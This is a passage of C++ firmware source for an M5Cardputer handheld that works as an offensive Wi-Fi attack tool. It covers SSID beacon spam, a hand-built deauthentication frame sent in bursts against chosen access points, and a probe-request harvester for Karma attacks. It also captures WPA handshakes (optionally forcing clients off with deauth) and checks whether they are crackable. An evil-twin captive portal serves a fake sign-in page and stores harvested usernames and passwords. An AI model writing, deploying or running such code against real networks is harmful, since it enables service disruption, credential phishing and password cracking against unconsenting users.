    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
    if (spamMsg[0] != '\0') d.drawString(spamMsg, 4, 100);
    d.drawString("Enter select  Bksp back", 4, 124);
}

void drawSpamText() {
    auto &d = M5Cardputer.Display;
    d.fillScreen(COLOR_BG);
    d.setTextSize(1);
    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
    d.drawString("Base name (max 26 chars):", 4, 20);
    char line[40];
    snprintf(line, sizeof(line), "%s_", spamText);
    d.drawString(line, 4, 40);
    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
    d.drawString("Enter start  Bksp delete", 4, 124);
}

void drawSpamRun() {
    auto &d = M5Cardputer.Display;
    d.fillScreen(COLOR_BG);
    d.setTextSize(1);
    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
    char line[48];
    snprintf(line, sizeof(line), "Spam: %s", SPAM_MODE_NAMES[spamMode]);
    d.drawString(line, 4, 4);
    if (spamHop) {
        snprintf(line, sizeof(line), "%s  hop 1-%d", spamRunning ? "RUNNING" : "stopped", SPAM_HOP_MAX_CH);
    } else {
        snprintf(line, sizeof(line), "%s  ch%d", spamRunning ? "RUNNING" : "stopped", spamCh);
    }
    d.drawString(line, 4, 18);
    snprintf(line, sizeof(line), "Sent %lu  errors %lu", (unsigned long)spamSent, (unsigned long)spamErrors);
    d.drawString(line, 4, 32);
    snprintf(line, sizeof(line), "Rounds %lu  hop %s", (unsigned long)spamRounds, spamHop ? "on" : "off");
    d.drawString(line, 4, 44);
    snprintf(line, sizeof(line), "Last: %s", spamLast);
    d.drawString(line, 4, 56);
    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
    d.drawString("Enter run  H hop  ;. ch  Bksp back", 4, 124);
}

void startSpam() {
    WiFi.mode(WIFI_STA);
    setAnalyzerChannel(spamCh);
    spamSent = 0;
    spamErrors = 0;
    spamRounds = 0;
    spamLast[0] = '\0';
    spamLastRound = 0;
    spamLastDraw = 0;
    spamRunning = true;
}

void stopSpam() {
    spamRunning = false;
}

void tickSpam() {
    if (!spamRunning) return;
    uint32_t now = millis();
    if (now - spamLastRound >= 20) {
        spamLastRound = now;
        spamRound();
    }
    if (now - spamLastDraw >= 1000) {
        spamLastDraw = now;
        drawSpamRun();
    }
}

constexpr size_t DEAUTH_LEN = 26;
const uint8_t DEAUTH_TEMPLATE[DEAUTH_LEN] = {0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                                             0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                             0x00, 0x00, 0xf0, 0xff, 0x02, 0x00};
constexpr int KARMA_QUEUE = 16;
constexpr int KARMA_CH_MAX = 13;
constexpr uint32_t KARMA_DWELL_MS = 250;
constexpr uint32_t CHECK_WINDOW_MS = 3000;

struct KarmaReq {
    uint8_t mac[6];
    uint8_t ch;
    uint8_t ssidLen;
    char ssid[SPAM_SSID_MAX + 1];
};
KarmaReq karmaQ[KARMA_QUEUE];
std::atomic<uint32_t> karmaQHead{0};
std::atomic<uint32_t> karmaQTail{0};
std::atomic<uint32_t> karmaSeen{0};
bool karmaRunning = false;
bool karmaHop = true;
int karmaCh = CH_FIRST;
uint32_t karmaDwellStart = 0;
uint32_t karmaLastDraw = 0;
char karmaLast[SPAM_SSID_MAX + 1] = "";

uint8_t deauthBssid[6] = {0};
int deauthCh = CH_FIRST;
char deauthSsid[SPAM_SSID_MAX + 1] = "";
bool deauthRunning = false;
uint32_t deauthBursts = 0;
uint32_t deauthSent = 0;
uint32_t deauthErrors = 0;
uint32_t deauthLastBurst = 0;
uint32_t deauthLastDraw = 0;

constexpr uint8_t CHK_SEEN = 0x01;
constexpr uint8_t CHK_RSN = 0x02;
constexpr uint8_t CHK_PSK = 0x04;
constexpr uint8_t CHK_SAE = 0x08;
constexpr uint8_t CHK_MFPC = 0x10;
constexpr uint8_t CHK_MFPR = 0x20;
std::atomic<uint8_t> checkFlags{0};
bool checkActive = false;
uint32_t checkEnd = 0;
enum PmfVerdict : uint8_t { V_NONE, V_NOT_SEEN, V_NO_PMF, V_PMF_OPTIONAL, V_PMF_REQUIRED };
PmfVerdict deauthVerdict = V_NONE;

const char *authLabel(wifi_auth_mode_t m) {
    switch (m) {
    case WIFI_AUTH_OPEN: return "OPEN";
    case WIFI_AUTH_WEP: return "WEP";
    case WIFI_AUTH_WPA_PSK: return "WPA";
    case WIFI_AUTH_WPA2_PSK: return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/2";
    case WIFI_AUTH_WPA3_PSK: return "WPA3";
    case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2/3";
    case WIFI_AUTH_OWE: return "OWE";
    default: return "ENT";
    }
}

void attackRadio() {
    if (WiFi.getMode() != WIFI_AP_STA) {
        WiFi.mode(WIFI_AP_STA);
        WiFi.softAP("KaijuAtk", nullptr, 1, 1, 4, false);
    }
}

constexpr int NET_LIST_MAX = 32;
constexpr int PMF_MAX_APS = 40;
constexpr uint32_t PMF_DWELL_MS = 600;
constexpr int PMF_SWEEPS = 2;

struct PmfEntry {
    uint8_t bssid[6];
    uint8_t flags;
};
PmfEntry pmfTable[PMF_MAX_APS];
std::atomic<int> pmfCount{0};
bool pmfPassActive = false;
int pmfPassCh = CH_FIRST;
int pmfPassSweep = 0;
uint32_t pmfPassDwell = 0;

int dlCount = 0;
int dlSel = 0;
int dlTop = 0;
char dlSsid[NET_LIST_MAX][SPAM_SSID_MAX + 1];
uint8_t dlBssid[NET_LIST_MAX][6];
wifi_auth_mode_t dlAuth[NET_LIST_MAX];
int dlChan[NET_LIST_MAX];
int dlRssi[NET_LIST_MAX];
PmfVerdict dlVerdict[NET_LIST_MAX];

void parseRsn(const uint8_t *d, uint32_t n, uint8_t &flags) {
    flags |= CHK_RSN;
    uint32_t p = 6;
    if (p + 2 > n) return;
    uint32_t pairwise = d[p] | (d[p + 1] << 8);
    p += 2 + 4 * pairwise;
    if (p + 2 > n) return;
    uint32_t akm = d[p] | (d[p + 1] << 8);
    p += 2;
    for (uint32_t i = 0; i < akm && p + 4 <= n; i++) {
        if (d[p] == 0x00 && d[p + 1] == 0x0f && d[p + 2] == 0xac) {
            if (d[p + 3] == 8) flags |= CHK_SAE;
            if (d[p + 3] == 2) flags |= CHK_PSK;
        }
        p += 4;
    }
    if (p + 2 > n) return;
    uint8_t caps = d[p];
    if (caps & 0x80) flags |= CHK_MFPC;
    if (caps & 0x40) flags |= CHK_MFPR;
}

uint8_t parseBeaconFlags(const wifi_promiscuous_pkt_t *pkt, uint32_t len) {
    uint8_t flags = CHK_SEEN;
    uint32_t end = len - 4;
    uint32_t p = 36;
    while (p + 2 <= end) {
        uint8_t tag = pkt->payload[p];
        uint8_t tlen = pkt->payload[p + 1];
        if (p + 2 + tlen > end) break;
        if (tag == 48) parseRsn(&pkt->payload[p + 2], tlen, flags);
        p += 2 + tlen;
    }
    return flags;
}

PmfVerdict computeVerdict(uint8_t f) {
    if (!(f & CHK_SEEN)) return V_NOT_SEEN;
    if ((f & CHK_SAE) && !(f & CHK_PSK)) return V_PMF_REQUIRED;
    if (f & CHK_MFPR) return V_PMF_REQUIRED;
    if (f & CHK_MFPC) return V_PMF_OPTIONAL;
    return V_NO_PMF;
}

bool verdictAllowsDeauth(PmfVerdict v) {
    return v == V_NO_PMF || v == V_PMF_OPTIONAL;
}

const char *verdictTag(PmfVerdict v) {
    switch (v) {
    case V_NO_PMF: return "VULN";
    case V_PMF_OPTIONAL: return "PART";
    case V_PMF_REQUIRED: return "PMF";
    default: return "--";
    }
}

constexpr int OWN_MAX = 32;
constexpr char OWN_PATH[] = "/kaiju/own_bssid.txt";
uint8_t ownBssid[OWN_MAX][6];
int ownCount = 0;

bool isOwnBssid(const uint8_t *b) {
    for (int i = 0; i < ownCount; i++) {
        if (memcmp(ownBssid[i], b, 6) == 0) return true;
    }
    return false;
}

void loadOwnList() {
    ownCount = 0;
    if (!ensureSd() || !SD.exists(OWN_PATH)) return;
    File f = SD.open(OWN_PATH, FILE_READ);
    if (!f) return;
    while (f.available() && ownCount < OWN_MAX) {
        String line = f.readStringUntil('\n');
        line.trim();
        unsigned int b[6];
        if (sscanf(line.c_str(), "%x:%x:%x:%x:%x:%x", &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) == 6) {
            for (int i = 0; i < 6; i++) ownBssid[ownCount][i] = static_cast<uint8_t>(b[i]);
            ownCount++;
        }
    }
    f.close();
}

void saveOwnList() {
    if (!ensureSd()) return;
    if (!SD.exists("/kaiju")) SD.mkdir("/kaiju");
    if (SD.exists(OWN_PATH)) SD.remove(OWN_PATH);
    File f = SD.open(OWN_PATH, FILE_WRITE);
    if (!f) return;
    for (int i = 0; i < ownCount; i++) {
        char mac[18];
        snprintf(mac, sizeof(mac), "%02x:%02x:%02x:%02x:%02x:%02x", ownBssid[i][0], ownBssid[i][1], ownBssid[i][2],
                 ownBssid[i][3], ownBssid[i][4], ownBssid[i][5]);
        f.println(mac);
    }
    f.close();
}

enum ListPurpose : uint8_t { PURPOSE_DEAUTH, PURPOSE_HANDSHAKE, PURPOSE_PORTAL };
ListPurpose listPurpose = PURPOSE_DEAUTH;

const char *rowTag(int idx) {
    if (dlVerdict[idx] == V_NOT_SEEN) return dlRssi[idx] < -85 ? "weak" : "--";
    return verdictTag(dlVerdict[idx]);
}

void drawDeauthSelect() {
    auto &d = M5Cardputer.Display;
    d.fillScreen(COLOR_BG);
    d.setTextSize(1);
    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
    char header[48];
    if (pmfPassActive) {
        snprintf(header, sizeof(header), "Checking ch%-2d  sweep %d/%d", pmfPassCh, pmfPassSweep + 1, PMF_SWEEPS);
    } else {
        snprintf(header, sizeof(header), "%s: %d networks (dBm)",
                 listPurpose == PURPOSE_HANDSHAKE ? "Handshake" : (listPurpose == PURPOSE_PORTAL ? "Portal" : "Deauth"),
                 dlCount);
    }
    d.drawString(header, 4, 4);
    for (int row = 0; row < WIFI_VISIBLE_ROWS; row++) {
        int idx = dlTop + row;
        if (idx >= dlCount) break;
        int y = 18 + row * 12;
        if (idx == dlSel) {
            d.fillRect(0, y - 1, d.width(), 11, COLOR_PRIMARY);
            d.setTextColor(COLOR_BG, COLOR_PRIMARY);
        } else {
            d.setTextColor(COLOR_PRIMARY, COLOR_BG);
        }
        const char *nm = dlSsid[idx][0] != '\0' ? dlSsid[idx] : "<hidden>";
        char tagged[16];
        snprintf(tagged, sizeof(tagged), "%c%s", isOwnBssid(dlBssid[idx]) ? '*' : ' ', nm);
        char line[48];
        snprintf(line, sizeof(line), "%-12.12s %-6s %-4s ch%-2d %3d", tagged, authLabel(dlAuth[idx]), rowTag(idx),
                 dlChan[idx], dlRssi[idx]);
        d.drawString(line, 4, y);
    }
    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
    d.drawString("VULN noPMF PART opt PMF req weak=far", 4, 114);
    if (pmfPassActive) {
        d.drawString("Bksp cancel check", 4, 124);
    } else if (listPurpose == PURPOSE_HANDSHAKE) {
        d.drawString("Enter capture  R sweep  Bksp back", 4, 124);
    } else if (listPurpose == PURPOSE_PORTAL) {
        d.drawString("Enter pick SSID  Bksp back", 4, 124);
    } else {
        d.drawString("Enter check  R recheck  Bksp back", 4, 124);
    }
}

void loadDeauthScan() {
    int n = WiFi.scanNetworks();
    dlCount = n > 0 ? (n < NET_LIST_MAX ? n : NET_LIST_MAX) : 0;
    for (int i = 0; i < dlCount; i++) {
        snprintf(dlSsid[i], sizeof(dlSsid[i]), "%s", WiFi.SSID(i).c_str());
        WiFi.BSSID(i, dlBssid[i]);
        dlAuth[i] = WiFi.encryptionType(i);
        dlChan[i] = static_cast<int>(WiFi.channel(i));
        dlRssi[i] = static_cast<int>(WiFi.RSSI(i));
        dlVerdict[i] = V_NOT_SEEN;
    }
    dlSel = 0;
    dlTop = 0;
}

void onPmfPass(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;
    auto *pkt = static_cast<wifi_promiscuous_pkt_t *>(buf);
    uint32_t len = pkt->rx_ctrl.sig_len;
    if (len < 40 || ((pkt->payload[0] >> 4) & 0xF) != 0x8) return;
    int count = pmfCount.load(std::memory_order_relaxed);
    int idx = -1;
    for (int i = 0; i < count; i++) {
        if (memcmp(pmfTable[i].bssid, &pkt->payload[16], 6) == 0) {
            idx = i;
            break;
        }
    }
    if (idx < 0) {
        if (count >= PMF_MAX_APS) return;
        idx = count;
        memcpy(pmfTable[idx].bssid, &pkt->payload[16], 6);
        pmfTable[idx].flags = 0;
        pmfCount.store(count + 1, std::memory_order_release);
    }
    pmfTable[idx].flags |= parseBeaconFlags(pkt, len);
}

void onPmfCheck(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;
    auto *pkt = static_cast<wifi_promiscuous_pkt_t *>(buf);
    uint32_t len = pkt->rx_ctrl.sig_len;
    if (len < 40 || ((pkt->payload[0] >> 4) & 0xF) != 0x8) return;
    if (memcmp(&pkt->payload[16], deauthBssid, 6) != 0) return;
    checkFlags.fetch_or(parseBeaconFlags(pkt, len), std::memory_order_relaxed);
}

void tagDeauthList() {
    int count = pmfCount.load(std::memory_order_acquire);
    for (int i = 0; i < dlCount; i++) {
        dlVerdict[i] = V_NOT_SEEN;
        for (int j = 0; j < count; j++) {
            if (memcmp(pmfTable[j].bssid, dlBssid[i], 6) == 0) {
                dlVerdict[i] = computeVerdict(pmfTable[j].flags);
                break;
            }
        }
    }
}

void startPmfPass() {
    pmfCount.store(0, std::memory_order_release);
    for (int i = 0; i < dlCount; i++) dlVerdict[i] = V_NOT_SEEN;
    pmfPassCh = CH_FIRST;
    pmfPassSweep = 0;
    WiFi.mode(WIFI_STA);
    setAnalyzerChannel(pmfPassCh);
    wifi_promiscuous_filter_t filter = {WIFI_PROMIS_FILTER_MASK_MGMT};
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(&onPmfPass);
    esp_wifi_set_promiscuous(true);
    pmfPassActive = true;
    pmfPassDwell = millis();
    drawDeauthSelect();
}

void stopPmfPass() {
    if (!pmfPassActive) return;
    pmfPassActive = false;
    esp_wifi_set_promiscuous(false);
    delay(20);
    tagDeauthList();
}

void tickPmfPass() {
    if (!pmfPassActive) return;
    uint32_t now = millis();
    if (now - pmfPassDwell < PMF_DWELL_MS) return;
    pmfPassDwell = now;
    pmfPassCh++;
    if (pmfPassCh > CH_LAST) {
        pmfPassCh = CH_FIRST;
        pmfPassSweep++;
        if (pmfPassSweep >= PMF_SWEEPS) {
            stopPmfPass();
            drawDeauthSelect();
            return;
        }
    }
    setAnalyzerChannel(pmfPassCh);
    drawDeauthSelect();
}

void enterDeauthSelect() {
    attackRadio();
    drawWifiMessage("Scanning...");
    WiFi.scanDelete();
    loadDeauthScan();
    startPmfPass();
}

void moveDeauthSelection(int delta) {
    int next = dlSel + delta;
    if (next < 0 || next >= dlCount) return;
    dlSel = next;
    if (dlSel < dlTop) dlTop = dlSel;
    if (dlSel >= dlTop + WIFI_VISIBLE_ROWS) dlTop = dlSel - WIFI_VISIBLE_ROWS + 1;
    drawDeauthSelect();
}

void chooseDeauthTarget() {
    memcpy(deauthBssid, dlBssid[dlSel], 6);
    snprintf(deauthSsid, sizeof(deauthSsid), "%s", dlSsid[dlSel]);
    deauthCh = dlChan[dlSel];
}

void drawDeauthCheck() {
    auto &d = M5Cardputer.Display;
    d.fillScreen(COLOR_BG);
    d.setTextSize(1);
    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
    char line[48];
    snprintf(line, sizeof(line), "Target: %s", deauthSsid);
    d.drawString(line, 4, 4);
    snprintf(line, sizeof(line), "ch%-2d %02X:%02X:%02X:%02X:%02X:%02X", deauthCh, deauthBssid[0], deauthBssid[1],
             deauthBssid[2], deauthBssid[3], deauthBssid[4], deauthBssid[5]);
    d.drawString(line, 4, 16);
    if (checkActive) {
        d.drawString("Listening for its beacon (3 s)...", 4, 40);
    } else if (deauthVerdict == V_NOT_SEEN) {
        d.drawString("NOT HEARD on this channel.", 4, 40);
        d.drawString("Don't attack: the AP isn't visible here.", 4, 52);
    } else if (deauthVerdict == V_NO_PMF) {
        d.drawString("VULNERABLE: PMF off", 4, 40);
        d.drawString("Deauth should work on its clients.", 4, 52);
    } else if (deauthVerdict == V_PMF_OPTIONAL) {
        d.drawString("PARTIAL: PMF optional", 4, 40);
        d.drawString("Works only on clients without PMF.", 4, 52);
    } else if (deauthVerdict == V_PMF_REQUIRED) {
        d.drawString("BLOCKED: PMF required", 4, 40);
        d.drawString("Deauth frames will be ignored.", 4, 52);
    }
    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
    if (!checkActive && verdictAllowsDeauth(deauthVerdict)) {
        d.drawString("Enter run  R retest  Bksp back", 4, 124);
    } else {
        d.drawString("R retest  Bksp back", 4, 124);
    }
}

void startDeauthCheck() {
    WiFi.mode(WIFI_STA);
    setAnalyzerChannel(deauthCh);
    checkFlags.store(0, std::memory_order_relaxed);
    wifi_promiscuous_filter_t filter = {WIFI_PROMIS_FILTER_MASK_MGMT};
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(&onPmfCheck);
    esp_wifi_set_promiscuous(true);
    checkActive = true;
    checkEnd = millis() + CHECK_WINDOW_MS;
    deauthVerdict = V_NONE;
    drawDeauthCheck();
}

void stopDeauthCheck() {
    if (!checkActive) return;
    checkActive = false;
    esp_wifi_set_promiscuous(false);
}

void tickDeauthCheck() {
    if (!checkActive) return;
    if (millis() >= checkEnd) {
        stopDeauthCheck();
        deauthVerdict = computeVerdict(checkFlags.load(std::memory_order_acquire));
        drawDeauthCheck();
    }
}

void deauthBurst() {
    uint8_t frame[DEAUTH_LEN];
    memcpy(frame, DEAUTH_TEMPLATE, DEAUTH_LEN);
    memcpy(frame + 10, deauthBssid, 6);
    memcpy(frame + 16, deauthBssid, 6);
    deauthBursts++;
    for (int i = 0; i < 3; i++) {
        if (wifiTx(WIFI_IF_AP, frame, DEAUTH_LEN) == ESP_OK) {
            deauthSent++;
        } else {
            deauthErrors++;
        }
        delay(1);
    }
}

void drawDeauthRun() {
    auto &d = M5Cardputer.Display;
    d.fillScreen(COLOR_BG);
    d.setTextSize(1);
    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
    char line[48];
    snprintf(line, sizeof(line), "Deauth  ch%-2d  %s", deauthCh, deauthRunning ? "RUNNING" : "stopped");
    d.drawString(line, 4, 4);
    snprintf(line, sizeof(line), "AP: %s", deauthSsid);
    d.drawString(line, 4, 18);
    snprintf(line, sizeof(line), "Bursts %lu  sent %lu  errors %lu", (unsigned long)deauthBursts,
             (unsigned long)deauthSent, (unsigned long)deauthErrors);
    d.drawString(line, 4, 32);
    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
    d.drawString("Enter run  Bksp back", 4, 124);
}

void startDeauth() {
    attackRadio();
    setAnalyzerChannel(deauthCh);
    deauthBursts = 0;
    deauthSent = 0;
    deauthErrors = 0;
    deauthLastBurst = 0;
    deauthLastDraw = 0;
    deauthRunning = true;
    drawDeauthRun();
}

void stopDeauth() {
    deauthRunning = false;
}

void tickDeauth() {
    if (!deauthRunning) return;
    uint32_t now = millis();
    if (now - deauthLastBurst >= 50) {
        deauthLastBurst = now;
        deauthBurst();
    }
    if (now - deauthLastDraw >= 1000) {
        deauthLastDraw = now;
        drawDeauthRun();
    }
}

void enqueueKarma(const uint8_t *mac, uint8_t ch, const uint8_t *ssid, uint8_t len) {
    uint32_t head = karmaQHead.load(std::memory_order_relaxed);
    uint32_t tail = karmaQTail.load(std::memory_order_acquire);
    if (head - tail >= KARMA_QUEUE) return;
    KarmaReq &r = karmaQ[head % KARMA_QUEUE];
    memcpy(r.mac, mac, 6);
    r.ch = ch;
    memcpy(r.ssid, ssid, len);
    r.ssid[len] = '\0';
    r.ssidLen = len;
    karmaQHead.store(head + 1, std::memory_order_release);
}

void onKarma(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;
    auto *pkt = static_cast<wifi_promiscuous_pkt_t *>(buf);
    uint32_t len = pkt->rx_ctrl.sig_len;
    if (len < 28 || ((pkt->payload[0] >> 4) & 0xF) != 0x4) return;
    karmaSeen.fetch_add(1, std::memory_order_relaxed);
    uint32_t end = len - 4;
    uint32_t p = 24;
    while (p + 2 <= end) {
        uint8_t tag = pkt->payload[p];
        uint8_t tlen = pkt->payload[p + 1];
        if (p + 2 + tlen > end) return;
        if (tag == 0) {
            if (tlen > 0 && tlen <= SPAM_SSID_MAX) {
                enqueueKarma(&pkt->payload[10], pkt->rx_ctrl.channel, &pkt->payload[p + 2], tlen);
            }
            return;
        }
        p += 2 + tlen;
    }
}






constexpr uint8_t EAPOL_LLC[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
std::atomic<uint32_t> hsMsgCount[5] = {};
std::atomic<uint32_t> hsEapolTotal{0};
std::atomic<uint32_t> hsDataSeen{0};
std::atomic<bool> hsBeaconSaved{false};
bool hsRunning = false;
bool hsDeauth = false;
uint32_t hsLastBurst = 0;
uint32_t hsLastDraw = 0;

int eapolMessageNumber(uint16_t ki) {
    bool install = ki & (1 << 6);
    bool ack = ki & (1 << 7);
    bool mic = ki & (1 << 8);
    bool secure = ki & (1 << 9);
    if (ack && !mic && !install) return 1;
    if (!ack && mic && !install && !secure) return 2;
    if (ack && mic && install) return 3;
    if (!ack && mic && !install && secure) return 4;
    return 0;
}

void onHandshake(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!pcapActive.load(std::memory_order_acquire)) return;
    auto *pkt = static_cast<wifi_promiscuous_pkt_t *>(buf);
    const uint8_t *p = pkt->payload;
    uint32_t len = pkt->rx_ctrl.sig_len;
    if (len < 24) return;
    if (type == WIFI_PKT_MGMT) {
        if (((p[0] >> 4) & 0xF) != 0x8) return;
        if (memcmp(&p[16], deauthBssid, 6) != 0) return;
        if (hsBeaconSaved.load(std::memory_order_relaxed)) return;
        if (!pcapEnqueue(pkt)) return;  // ring full: beacon not kept, so try the next one
        hsBeaconSaved.store(true, std::memory_order_relaxed);
        return;
    }
    if (type != WIFI_PKT_DATA) return;
    if (memcmp(&p[4], deauthBssid, 6) != 0 && memcmp(&p[10], deauthBssid, 6) != 0 &&
        memcmp(&p[16], deauthBssid, 6) != 0) {
        return;
    }
    hsDataSeen.fetch_add(1, std::memory_order_relaxed);
    bool toDs = p[1] & 0x01;
    bool fromDs = p[1] & 0x02;
    bool qos = p[0] & 0x80;
    uint32_t hdr = 24 + ((toDs && fromDs) ? 6 : 0) + (qos ? 2 : 0);
    if (len < hdr + 17) return;
    if (memcmp(&p[hdr], EAPOL_LLC, 8) != 0) return;
    hsEapolTotal.fetch_add(1, std::memory_order_relaxed);
    int msg = eapolMessageNumber(static_cast<uint16_t>((p[hdr + 13] << 8) | p[hdr + 14]));
    if (!pcapEnqueue(pkt)) return;  // ring full: frame not kept, so don't count it
    if (msg > 0) hsMsgCount[msg].fetch_add(1, std::memory_order_relaxed);
}

void drawHandshake() {
    auto &d = M5Cardputer.Display;
    d.fillScreen(COLOR_BG);
    d.setTextSize(1);
    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
    char line[48];
    snprintf(line, sizeof(line), "Handshake  ch%-2d  %s", deauthCh, hsRunning ? "RUNNING" : "stopped");
    d.drawString(line, 4, 4);
    snprintf(line, sizeof(line), "AP: %s", deauthSsid);
    d.drawString(line, 4, 16);
    uint32_t m1 = hsMsgCount[1].load(std::memory_order_relaxed);
    uint32_t m2 = hsMsgCount[2].load(std::memory_order_relaxed);
    uint32_t m3 = hsMsgCount[3].load(std::memory_order_relaxed);
    uint32_t m4 = hsMsgCount[4].load(std::memory_order_relaxed);
    snprintf(line, sizeof(line), "M1 %lu  M2 %lu  M3 %lu  M4 %lu", (unsigned long)m1, (unsigned long)m2,
             (unsigned long)m3, (unsigned long)m4);
    d.drawString(line, 4, 30);
    snprintf(line, sizeof(line), "Data %lu  EAPOL %lu",
             (unsigned long)hsDataSeen.load(std::memory_order_relaxed),
             (unsigned long)hsEapolTotal.load(std::memory_order_relaxed));
    d.drawString(line, 4, 42);
    snprintf(line, sizeof(line), "beacon %s  deauth %s", hsBeaconSaved.load(std::memory_order_relaxed) ? "yes" : "no",
             hsDeauth ? "on" : "off");
    d.drawString(line, 4, 54);
    bool crackable = m2 > 0 && (m1 > 0 || m3 > 0);
    d.drawString(crackable ? "Crackable: YES (M2 + M1 or M3)" : "Crackable: not yet", 4, 66);
    if (pcapActive.load(std::memory_order_acquire)) {
        if (pcapBytes < 1024) {
            snprintf(line, sizeof(line), "%s  %lu B", pcapName, (unsigned long)pcapBytes);
        } else {
            snprintf(line, sizeof(line), "%s  %lu KB", pcapName, (unsigned long)(pcapBytes / 1024));
        }
    } else {
        snprintf(line, sizeof(line), "%s", pcapMsg);
    }
    d.drawString(line, 4, 78);
    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
    d.drawString("Enter run  D deauth  Bksp back", 4, 124);
}

void enterScanList() {
    attackRadio();
    drawWifiMessage("Scanning...");
    WiFi.scanDelete();
    loadDeauthScan();
    drawDeauthSelect();
}

void startHandshake() {
    attackRadio();
    startPcap("hs");
    if (!pcapActive.load(std::memory_order_acquire)) return;
    setAnalyzerChannel(deauthCh);
    for (auto &c : hsMsgCount) c.store(0, std::memory_order_relaxed);
    hsEapolTotal.store(0, std::memory_order_relaxed);
    hsDataSeen.store(0, std::memory_order_relaxed);
    hsBeaconSaved.store(false, std::memory_order_relaxed);
    wifi_promiscuous_filter_t filter = {WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA};
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(&onHandshake);
    esp_wifi_set_promiscuous(true);
    hsRunning = true;
    hsLastBurst = 0;
    hsLastDraw = 0;
    drawHandshake();
}

void stopHandshake() {
    if (!hsRunning) return;
    hsRunning = false;
    esp_wifi_set_promiscuous(false);
    delay(20);
    char path[64];
    snprintf(path, sizeof(path), "/pcap/%s", pcapName);
    bool crackable = hsMsgCount[2].load(std::memory_order_relaxed) > 0 &&
                     (hsMsgCount[1].load(std::memory_order_relaxed) > 0 || hsMsgCount[3].load(std::memory_order_relaxed) > 0);
    stopPcap();
    if (!crackable) {
        if (SD.exists(path)) SD.remove(path);
        snprintf(pcapMsg, sizeof(pcapMsg), "%s", "no crackable handshake: file removed");
    }
}

void tickHandshake() {
    if (!hsRunning) return;
    uint32_t now = millis();
    if (hsDeauth && now - hsLastBurst >= 300) {
        hsLastBurst = now;
        deauthBurst();
    }
    if (now - hsLastDraw >= 1000) {
        hsLastDraw = now;
        drawHandshake();
    }
}

constexpr size_t PORTAL_PAGE_MAX = 24576;
constexpr char PORTAL_TEMPLATE_DIR[] = "/PortalTemplates";
constexpr char PORTAL_CREDS_DIR[] = "/BruceEvilCreds";
constexpr int PORTAL_CREDS_FILE_MAX = 50;  // files kept per SSID (x 200 lines); oldest deleted when full
const char *const PORTAL_DEFAULT_PAGE = R"HTML(<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sign in</title></head>
<body style="font-family:sans-serif;max-width:340px;margin:40px auto;padding:0 16px">
<h2>Sign in to network</h2>
<form method="POST" action="/post">
<input name="username" placeholder="Username" style="width:100%;padding:8px;margin:6px 0;box-sizing:border-box">
<input name="password" type="password" placeholder="Password" style="width:100%;padding:8px;margin:6px 0;box-sizing:border-box">
<button type="submit" style="width:100%;padding:10px;margin-top:8px">Connect</button>
</form></body></html>)HTML";

WebServer portalServer(80);
DNSServer portalDns;
bool portalRunning = false;
bool portalRoutesAdded = false;
String portalPage;
char portalTemplateName[40] = "built-in";
uint32_t portalViews = 0;
uint32_t portalCaptured = 0;
char portalLast[41] = "";
char portalCredsName[64] = "";
uint32_t portalLastDraw = 0;

bool loadPortalPage(String &out) {
    out = "";
    if (!SD.exists(PORTAL_TEMPLATE_DIR)) return false;
    File dir = SD.open(PORTAL_TEMPLATE_DIR);
    if (!dir || !dir.isDirectory()) return false;
    File f = dir.openNextFile();
    while (f) {
        String fname = String(f.name());
        if (fname.endsWith(".html") || fname.endsWith(".htm")) {
            if (f.size() > PORTAL_PAGE_MAX) {
                f.close();
                break;
            }
            out.reserve(f.size());
            while (f.available()) out += static_cast<char>(f.read());
            snprintf(portalTemplateName, sizeof(portalTemplateName), "%s", fname.c_str());
            f.close();
            dir.close();
            return true;
        }
        f.close();
        f = dir.openNextFile();
    }
    dir.close();
    return false;
}

void portalRedirect() {
    portalServer.sendHeader("Location", "http://" + WiFi.softAPIP().toString() + "/", true);
    portalServer.send(302, "text/plain", "");
}

uint32_t portalSession = 0;
const char *const PORTAL_CLIENT_TIME_SCRIPT =
    "<script>document.addEventListener('submit',function(e){var i=document.createElement('input');"
    "i.type='hidden';i.name='client_time';i.value=new Date().toString();e.target.appendChild(i);},true);</script>";

String portalWithScript(const String &page) {
    String out = page;
    int at = out.indexOf("</body>");
    if (at < 0) at = out.indexOf("</BODY>");
    if (at >= 0) {
        out = out.substring(0, at) + PORTAL_CLIENT_TIME_SCRIPT + out.substring(at);
    } else {
        out += PORTAL_CLIENT_TIME_SCRIPT;
    }
    return out;
}

void portalHandleRoot() {
    String host = portalServer.hostHeader();
    if (host.length() && host != WiFi.softAPIP().toString()) {
        portalRedirect();
        return;
    }
    portalViews++;
    portalServer.send(200, "text/html", portalWithScript(portalPage));
}

constexpr int LOG_MAX_ENTRIES = 200;
